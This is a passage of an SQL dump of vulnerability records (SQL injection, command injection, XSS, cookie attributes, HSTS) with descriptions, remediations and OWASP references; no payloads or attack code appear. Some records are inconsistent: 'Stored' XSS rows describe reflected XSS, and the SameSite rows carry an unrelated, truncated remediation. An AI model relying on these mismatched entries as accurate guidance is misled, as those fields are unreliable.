(254, 'Missing HTTP Strict Transport Security Header', 'HTTP Strict Transport Security (HSTS) feature lets a web application inform the browser through the use of a special response header that it should never establish a connection to the specified domain servers using un-encrypted HTTP. Instead, it should automatically establish all connection requests to access the site through HTTPS. It also prevents users from overriding certificate errors.', 'Implement HSTS header.Here’s an example of the HSTS header implementation:\nStrict-Transport-Security: max-age=31536000; includeSubDomains', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security', NULL, 'WSTG-CONF-07', 205, 'Low'),
(255, 'SQL Injection', 'SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.\n\nA wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server.', 'The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize every variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.\n\nYou should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective:\n\nOne common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.\nAnother often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.', 'https://portswigger.net/kb/issues/00100200_sql-injection', NULL, 'WSTG-INPV-05', 206, 'High'),
(256, 'Stored Cross Site Scriptng', 'Reflected cross-site scripting vulnerabilities arise when data is copied from a request and echoed into the application\'s immediate response in an unsafe way. An attacker can use the vulnerability to construct a request that, if issued by another application user, will cause JavaScript code supplied by the attacker to execute within the user\'s browser in the context of that user\'s session with the application.\n\nThe attacker-supplied code can perform a wide variety of actions, such as stealing the victim\'s session token or login credentials, performing arbitrary actions on the victim\'s behalf, and logging their keystrokes.\n\nUsers can be induced to issue the attacker\'s crafted request in various ways. For example, the attacker can send a victim a link containing a malicious URL in an email or instant message. They can submit the link to popular web sites that allow content authoring, for example in blog comments. And they can create an innocuous looking web site that causes anyone viewing it to make arbitrary cross-domain requests to the vulnerable application (using either the GET or the POST method).', 'In most situations where user-controllable data is copied into application responses, cross-site scripting attacks can be prevented using two layers of defenses:\n\nInput should be validated as strictly as possible on arrival, given the kind of content that it is expected to contain. For example, personal names should consist of alphabetical and a small range of typographical characters, and be relatively short; a year of birth should consist of exactly four numerals; email addresses should match a well-defined regular expression. Input which fails the validation should be rejected, not sanitized.\nUser input should be HTML-encoded at any point where it is copied into application responses. All HTML metacharacters, including < > \" \' and =, should be replaced with the corresponding HTML entities (&lt; &gt; etc).\nIn cases where the application\'s functionality allows users to author content using a restricted subset of HTML tags and attributes (for example, blog comments which allow limited formatting and linking), it is necessary to parse the supplied HTML to validate that it does not use any dangerous syntax; this is a non-trivial task.', 'https://portswigger.net/kb/issues/00200300_cross-site-scripting-reflected', NULL, 'WSTG-INPV-01', 206, 'High'),
(257, 'Sensitive File Disclosure', 'Sensitive file leak due to Security Misconfiguration', 'Configure your web server to prevent public access to the private information by implementing access control mechanisms', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/09-Test_File_Permission', NULL, 'WSTG-CONF-09', 206, 'Medium'),
(258, 'Missing Secure Attribute in Cookie Header', 'The Secure attribute tells the browser to only send the cookie if the request is being sent over a secure channel such as HTTPS. This will help protect the cookie from being passed in unencrypted requests. If the application can be accessed over both HTTP and HTTPS, an attacker could be able to redirect the user to send their cookie as part of non-protected requests.', 'Implement Secure Attribute in Cookies', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 206, 'Low'),
(259, 'Missing Expires Attribute in Cookie Header', 'The Expires attribute is used to:\n- set persistent cookies\n- limit lifespan if a session lives for too long\n- remove a cookie forcefully by setting it to a past date\n- Unlike session cookies, persistent cookies will be used by the browser until the cookie expires. Once the expiration date has exceeded the time set, the browser will delete the cookie.', 'Implement Expires Attribute in Cookies', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 206, 'Low'),
(260, 'Missing SameSite Attribute in Cookie Header', 'The SameSite attribute is used to assert that a cookie ought not to be sent along with cross-site requests. This feature allows the server to mitigate the risk of cross-orgin information leakage. In some cases, it is used too as a risk reduction (or defense in depth mechanism) strategy to prevent cross-site request forgery attacks.', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 206, 'Low'),
(261, 'Missing HTTP Strict Transport Security Header', 'HTTP Strict Transport Security (HSTS) feature lets a web application inform the browser through the use of a special response header that it should never establish a connection to the specified domain servers using un-encrypted HTTP. Instead, it should automatically establish all connection requests to access the site through HTTPS. It also prevents users from overriding certificate errors.', 'Implement HSTS header.Here’s an example of the HSTS header implementation:\nStrict-Transport-Security: max-age=31536000; includeSubDomains', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security', NULL, 'WSTG-CONF-07', 206, 'Low'),
(262, 'Web Application Framework Infomation Leakage', 'There is nothing new under the sun, and nearly every web application that one may think of developing has already been developed. With the vast number of free and Open Source software projects that are actively developed and deployed around the world, it is very likely that an application security test will face a target that is entirely or partly dependent on these well known applications or frameworks (e.g. WordPress, phpBB, Mediawiki, etc). Knowing the web application components that are being tested significantly helps in the testing process and will also drastically reduce the effort required during the test. These well known web applications have known HTML headers, cookies, and directory structures that can be enumerated to identify the application. Most of the web frameworks have several markers in those locations which help an attacker or tester to recognize them. This is basically what all automatic tools do, they look for a marker from a predefined location and then compare it to the database of known signatures. For better accuracy several markers are usually used.', 'While efforts can be made to use different cookie names (through changing configs), hiding or changing file/directory paths (through rewriting or source code changes), removing known headers, etc. such efforts boil down to “security through obscurity”. System owners/admins should recognize that those efforts only slow down the most basic of adversaries. The time/effort may be better used on stakeholder awareness and solution maintenance activities.', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/01-Information_Gathering/08-Fingerprint_Web_Application_Framework', NULL, 'WSTG-INFO-08', 206, 'Low'),
(263, 'Web Application Framework Infomation Leakage', 'There is nothing new under the sun, and nearly every web application that one may think of developing has already been developed. With the vast number of free and Open Source software projects that are actively developed and deployed around the world, it is very likely that an application security test will face a target that is entirely or partly dependent on these well known applications or frameworks (e.g. WordPress, phpBB, Mediawiki, etc). Knowing the web application components that are being tested significantly helps in the testing process and will also drastically reduce the effort required during the test. These well known web applications have known HTML headers, cookies, and directory structures that can be enumerated to identify the application. Most of the web frameworks have several markers in those locations which help an attacker or tester to recognize them. This is basically what all automatic tools do, they look for a marker from a predefined location and then compare it to the database of known signatures. For better accuracy several markers are usually used.', 'While efforts can be made to use different cookie names (through changing configs), hiding or changing file/directory paths (through rewriting or source code changes), removing known headers, etc. such efforts boil down to “security through obscurity”. System owners/admins should recognize that those efforts only slow down the most basic of adversaries. The time/effort may be better used on stakeholder awareness and solution maintenance activities.', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/01-Information_Gathering/08-Fingerprint_Web_Application_Framework', NULL, 'WSTG-INFO-08', 67, 'Low'),
(264, 'Missing HTTP Strict Transport Security Header', 'HTTP Strict Transport Security (HSTS) feature lets a web application inform the browser through the use of a special response header that it should never establish a connection to the specified domain servers using un-encrypted HTTP. Instead, it should automatically establish all connection requests to access the site through HTTPS. It also prevents users from overriding certificate errors.', 'Implement HSTS header.Here’s an example of the HSTS header implementation:\nStrict-Transport-Security: max-age=31536000; includeSubDomains', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security', NULL, 'WSTG-CONF-07', 207, 'Low'),
(265, 'Missing HTTP Strict Transport Security Header', 'HTTP Strict Transport Security (HSTS) feature lets a web application inform the browser through the use of a special response header that it should never establish a connection to the specified domain servers using un-encrypted HTTP. Instead, it should automatically establish all connection requests to access the site through HTTPS. It also prevents users from overriding certificate errors.', 'Implement HSTS header.Here’s an example of the HSTS header implementation:\nStrict-Transport-Security: max-age=31536000; includeSubDomains', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security', NULL, 'WSTG-CONF-07', 209, 'Low'),
(266, 'Missing HTTP Strict Transport Security Header', 'HTTP Strict Transport Security (HSTS) feature lets a web application inform the browser through the use of a special response header that it should never establish a connection to the specified domain servers using un-encrypted HTTP. Instead, it should automatically establish all connection requests to access the site through HTTPS. It also prevents users from overriding certificate errors.', 'Implement HSTS header.Here’s an example of the HSTS header implementation:\nStrict-Transport-Security: max-age=31536000; includeSubDomains', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security', NULL, 'WSTG-CONF-07', 210, 'Low'),
(267, 'Missing HTTP Strict Transport Security Header', 'HTTP Strict Transport Security (HSTS) feature lets a web application inform the browser through the use of a special response header that it should never establish a connection to the specified domain servers using un-encrypted HTTP. Instead, it should automatically establish all connection requests to access the site through HTTPS. It also prevents users from overriding certificate errors.', 'Implement HSTS header.Here’s an example of the HSTS header implementation:\nStrict-Transport-Security: max-age=31536000; includeSubDomains', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security', NULL, 'WSTG-CONF-07', 211, 'Low'),
(268, 'SQL Injection', 'SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.\n\nA wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server.', 'The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize every variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.\n\nYou should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective:\n\nOne common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.\nAnother often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.', 'https://portswigger.net/kb/issues/00100200_sql-injection', NULL, 'WSTG-INPV-05', 215, 'High'),
(269, 'Stored Cross Site Scriptng', 'Reflected cross-site scripting vulnerabilities arise when data is copied from a request and echoed into the application\'s immediate response in an unsafe way. An attacker can use the vulnerability to construct a request that, if issued by another application user, will cause JavaScript code supplied by the attacker to execute within the user\'s browser in the context of that user\'s session with the application.\n\nThe attacker-supplied code can perform a wide variety of actions, such as stealing the victim\'s session token or login credentials, performing arbitrary actions on the victim\'s behalf, and logging their keystrokes.\n\nUsers can be induced to issue the attacker\'s crafted request in various ways. For example, the attacker can send a victim a link containing a malicious URL in an email or instant message. They can submit the link to popular web sites that allow content authoring, for example in blog comments. And they can create an innocuous looking web site that causes anyone viewing it to make arbitrary cross-domain requests to the vulnerable application (using either the GET or the POST method).', 'In most situations where user-controllable data is copied into application responses, cross-site scripting attacks can be prevented using two layers of defenses:\n\nInput should be validated as strictly as possible on arrival, given the kind of content that it is expected to contain. For example, personal names should consist of alphabetical and a small range of typographical characters, and be relatively short; a year of birth should consist of exactly four numerals; email addresses should match a well-defined regular expression. Input which fails the validation should be rejected, not sanitized.\nUser input should be HTML-encoded at any point where it is copied into application responses. All HTML metacharacters, including < > \" \' and =, should be replaced with the corresponding HTML entities (&lt; &gt; etc).\nIn cases where the application\'s functionality allows users to author content using a restricted subset of HTML tags and attributes (for example, blog comments which allow limited formatting and linking), it is necessary to parse the supplied HTML to validate that it does not use any dangerous syntax; this is a non-trivial task.', 'https://portswigger.net/kb/issues/00200300_cross-site-scripting-reflected', NULL, 'WSTG-INPV-01', 215, 'High'),
(270, 'Sensitive File Disclosure', 'Sensitive file leak due to Security Misconfiguration', 'Configure your web server to prevent public access to the private information by implementing access control mechanisms', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/09-Test_File_Permission', NULL, 'WSTG-CONF-09', 215, 'Medium'),
(271, 'Missing Secure Attribute in Cookie Header', 'The Secure attribute tells the browser to only send the cookie if the request is being sent over a secure channel such as HTTPS. This will help protect the cookie from being passed in unencrypted requests. If the application can be accessed over both HTTP and HTTPS, an attacker could be able to redirect the user to send their cookie as part of non-protected requests.', 'Implement Secure Attribute in Cookies', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 215, 'Low'),
(272, 'Missing Expires Attribute in Cookie Header', 'The Expires attribute is used to:\n- set persistent cookies\n- limit lifespan if a session lives for too long\n- remove a cookie forcefully by setting it to a past date\n- Unlike session cookies, persistent cookies will be used by the browser until the cookie expires. Once the expiration date has exceeded the time set, the browser will delete the cookie.', 'Implement Expires Attribute in Cookies', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 215, 'Low'),
(273, 'Missing SameSite Attribute in Cookie Header', 'The SameSite attribute is used to assert that a cookie ought not to be sent along with cross-site requests. This feature allows the server to mitigate the risk of cross-orgin information leakage. In some cases, it is used too as a risk reduction (or defense in depth mechanism) strategy to prevent cross-site request forgery attacks.', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 215, 'Low');
INSERT INTO `owasp` (`OID`, `Vul_name`, `Vul_des`, `vul_sol`, `vul_ref`, `payloadlist`, `OType`, `PID`, `Severity`) VALUES
(274, 'Missing HTTP Strict Transport Security Header', 'HTTP Strict Transport Security (HSTS) feature lets a web application inform the browser through the use of a special response header that it should never establish a connection to the specified domain servers using un-encrypted HTTP. Instead, it should automatically establish all connection requests to access the site through HTTPS. It also prevents users from overriding certificate errors.', 'Implement HSTS header.Here’s an example of the HSTS header implementation:\nStrict-Transport-Security: max-age=31536000; includeSubDomains', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security', NULL, 'WSTG-CONF-07', 215, 'Low'),
(275, 'SQL Injection', 'SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.\n\nA wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server.', 'The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize every variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.\n\nYou should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective:\n\nOne common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.\nAnother often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.', 'https://portswigger.net/kb/issues/00100200_sql-injection', NULL, 'WSTG-INPV-05', 216, 'Medium'),
(276, 'Stored Cross Site Scriptng', 'Reflected cross-site scripting vulnerabilities arise when data is copied from a request and echoed into the application\'s immediate response in an unsafe way. An attacker can use the vulnerability to construct a request that, if issued by another application user, will cause JavaScript code supplied by the attacker to execute within the user\'s browser in the context of that user\'s session with the application.\n\nThe attacker-supplied code can perform a wide variety of actions, such as stealing the victim\'s session token or login credentials, performing arbitrary actions on the victim\'s behalf, and logging their keystrokes.\n\nUsers can be induced to issue the attacker\'s crafted request in various ways. For example, the attacker can send a victim a link containing a malicious URL in an email or instant message. They can submit the link to popular web sites that allow content authoring, for example in blog comments. And they can create an innocuous looking web site that causes anyone viewing it to make arbitrary cross-domain requests to the vulnerable application (using either the GET or the POST method).', 'In most situations where user-controllable data is copied into application responses, cross-site scripting attacks can be prevented using two layers of defenses:\n\nInput should be validated as strictly as possible on arrival, given the kind of content that it is expected to contain. For example, personal names should consist of alphabetical and a small range of typographical characters, and be relatively short; a year of birth should consist of exactly four numerals; email addresses should match a well-defined regular expression. Input which fails the validation should be rejected, not sanitized.\nUser input should be HTML-encoded at any point where it is copied into application responses. All HTML metacharacters, including < > \" \' and =, should be replaced with the corresponding HTML entities (&lt; &gt; etc).\nIn cases where the application\'s functionality allows users to author content using a restricted subset of HTML tags and attributes (for example, blog comments which allow limited formatting and linking), it is necessary to parse the supplied HTML to validate that it does not use any dangerous syntax; this is a non-trivial task.', 'https://portswigger.net/kb/issues/00200300_cross-site-scripting-reflected', NULL, 'WSTG-INPV-01', 216, 'High'),
(277, 'Sensitive File Disclosure', 'Sensitive file leak due to Security Misconfiguration', 'Configure your web server to prevent public access to the private information by implementing access control mechanisms', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/09-Test_File_Permission', NULL, 'WSTG-CONF-09', 216, 'Low'),
(278, 'Missing Secure Attribute in Cookie Header', 'The Secure attribute tells the browser to only send the cookie if the request is being sent over a secure channel such as HTTPS. This will help protect the cookie from being passed in unencrypted requests. If the application can be accessed over both HTTP and HTTPS, an attacker could be able to redirect the user to send their cookie as part of non-protected requests.', 'Implement Secure Attribute in Cookies', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 216, 'Medium'),
(279, 'Missing Expires Attribute in Cookie Header', 'The Expires attribute is used to:\n- set persistent cookies\n- limit lifespan if a session lives for too long\n- remove a cookie forcefully by setting it to a past date\n- Unlike session cookies, persistent cookies will be used by the browser until the cookie expires. Once the expiration date has exceeded the time set, the browser will delete the cookie.', 'Implement Expires Attribute in Cookies', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 216, 'Low'),
(280, 'Missing SameSite Attribute in Cookie Header', 'The SameSite attribute is used to assert that a cookie ought not to be sent along with cross-site requests. This feature allows the server to mitigate the risk of cross-orgin information leakage. In some cases, it is used too as a risk reduction (or defense in depth mechanism) strategy to prevent cross-site request forgery attacks.', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 216, 'Low'),
(281, 'Missing HTTP Strict Transport Security Header', 'HTTP Strict Transport Security (HSTS) feature lets a web application inform the browser through the use of a special response header that it should never establish a connection to the specified domain servers using un-encrypted HTTP. Instead, it should automatically establish all connection requests to access the site through HTTPS. It also prevents users from overriding certificate errors.', 'Implement HSTS header.Here’s an example of the HSTS header implementation:\nStrict-Transport-Security: max-age=31536000; includeSubDomains', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security', NULL, 'WSTG-CONF-07', 216, 'Low'),
(285, 'Command Injection', 'Operating system command injection vulnerabilities arise when an application incorporates user-controllable data into a command that is processed by a shell command interpreter. If the user data is not strictly validated, an attacker can use shell metacharacters to modify the command that is executed, and inject arbitrary further commands that will be executed by the server.\n\nOS command injection vulnerabilities are usually very serious and may lead to compromise of the server hosting the application, or of the application\'s own data and functionality. It may also be possible to use the server as a platform for attacks against other systems. The exact potential for exploitation depends upon the security context in which the command is executed, and the privileges that this context has regarding sensitive resources on the server.', 'If possible, applications should avoid incorporating user-controllable data into operating system commands. In almost every situation, there are safer alternative methods of performing server-level tasks, which cannot be manipulated to perform additional commands than the one intended.\n\nIf it is considered unavoidable to incorporate user-supplied data into operating system commands, the following two layers of defense should be used to prevent attacks:\n\nThe user data should be strictly validated. Ideally, a whitelist of specific accepted values should be used. Otherwise, only short alphanumeric strings should be accepted. Input containing any other data, including any conceivable shell metacharacter or whitespace, should be rejected.\nThe application should use command APIs that launch a specific process via its name and command-line parameters, rather than passing a command string to a shell interpreter that supports command chaining and redirection. For example, the Java API Runtime.exec and the ASP.NET API Process.Start do not support shell metacharacters. This defense can mitigate the impact of an attack even in the event that an attacker circumvents the input validation defenses.', 'https://portswigger.net/kb/issues/00100100_os-command-injection', NULL, 'WSTG-INPV-12', 214, 'High'),
(286, 'SQL Injection', 'SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.\n\nA wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server.', 'The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize every variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.\n\nYou should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective:\n\nOne common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.\nAnother often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.', 'https://portswigger.net/kb/issues/00100200_sql-injection', NULL, 'WSTG-INPV-05', 218, 'High'),
(287, 'Stored Cross Site Scriptng', 'Reflected cross-site scripting vulnerabilities arise when data is copied from a request and echoed into the application\'s immediate response in an unsafe way. An attacker can use the vulnerability to construct a request that, if issued by another application user, will cause JavaScript code supplied by the attacker to execute within the user\'s browser in the context of that user\'s session with the application.\n\nThe attacker-supplied code can perform a wide variety of actions, such as stealing the victim\'s session token or login credentials, performing arbitrary actions on the victim\'s behalf, and logging their keystrokes.\n\nUsers can be induced to issue the attacker\'s crafted request in various ways. For example, the attacker can send a victim a link containing a malicious URL in an email or instant message. They can submit the link to popular web sites that allow content authoring, for example in blog comments. And they can create an innocuous looking web site that causes anyone viewing it to make arbitrary cross-domain requests to the vulnerable application (using either the GET or the POST method).', 'In most situations where user-controllable data is copied into application responses, cross-site scripting attacks can be prevented using two layers of defenses:\n\nInput should be validated as strictly as possible on arrival, given the kind of content that it is expected to contain. For example, personal names should consist of alphabetical and a small range of typographical characters, and be relatively short; a year of birth should consist of exactly four numerals; email addresses should match a well-defined regular expression. Input which fails the validation should be rejected, not sanitized.\nUser input should be HTML-encoded at any point where it is copied into application responses. All HTML metacharacters, including < > \" \' and =, should be replaced with the corresponding HTML entities (&lt; &gt; etc).\nIn cases where the application\'s functionality allows users to author content using a restricted subset of HTML tags and attributes (for example, blog comments which allow limited formatting and linking), it is necessary to parse the supplied HTML to validate that it does not use any dangerous syntax; this is a non-trivial task.', 'https://portswigger.net/kb/issues/00200300_cross-site-scripting-reflected', NULL, 'WSTG-INPV-01', 218, 'High'),
(288, 'Sensitive File Disclosure', 'Sensitive file leak due to Security Misconfiguration', 'Configure your web server to prevent public access to the private information by implementing access control mechanisms', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/09-Test_File_Permission', NULL, 'WSTG-CONF-09', 218, 'Medium'),
(289, 'Missing Secure Attribute in Cookie Header', 'The Secure attribute tells the browser to only send the cookie if the request is being sent over a secure channel such as HTTPS. This will help protect the cookie from being passed in unencrypted requests. If the application can be accessed over both HTTP and HTTPS, an attacker could be able to redirect the user to send their cookie as part of non-protected requests.', 'Implement Secure Attribute in Cookies', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 218, 'Low'),
(290, 'Missing Expires Attribute in Cookie Header', 'The Expires attribute is used to:\n- set persistent cookies\n- limit lifespan if a session lives for too long\n- remove a cookie forcefully by setting it to a past date\n- Unlike session cookies, persistent cookies will be used by the browser until the cookie expires. Once the expiration date has exceeded the time set, the browser will delete the cookie.', 'Implement Expires Attribute in Cookies', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 218, 'Low'),
(291, 'Missing SameSite Attribute in Cookie Header', 'The SameSite attribute is used to assert that a cookie ought not to be sent along with cross-site requests. This feature allows the server to mitigate the risk of cross-orgin information leakage. In some cases, it is used too as a risk reduction (or defense in depth mechanism) strategy to prevent cross-site request forgery attacks.', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 218, 'Low'),
